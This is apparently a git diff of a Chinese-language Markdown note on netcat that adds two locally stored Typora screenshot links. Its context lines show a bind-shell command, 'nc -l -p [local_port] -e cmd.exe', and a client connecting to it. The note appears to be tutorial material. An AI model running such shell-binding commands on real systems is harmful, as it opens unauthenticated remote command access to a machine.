@@ -42,6 +42,8 @@ nc [remote_host] [remote_port]
 nc -l -p [local_port] -e cmd.exe
 ```
 
+![image-20210124101549287](C:\Users\clcheng\AppData\Roaming\Typora\typora-user-images\image-20210124101549287.png)
+
 二、客户端
 
 ```bash
@@ -49,3 +51,4 @@ nc -l -p [local_port] -e cmd.exe
 nc [remote_host] [remote_port]
 ```
 
+![image-20210124101606660](C:\Users\clcheng\AppData\Roaming\Typora\typora-user-images\image-20210124101606660.png)
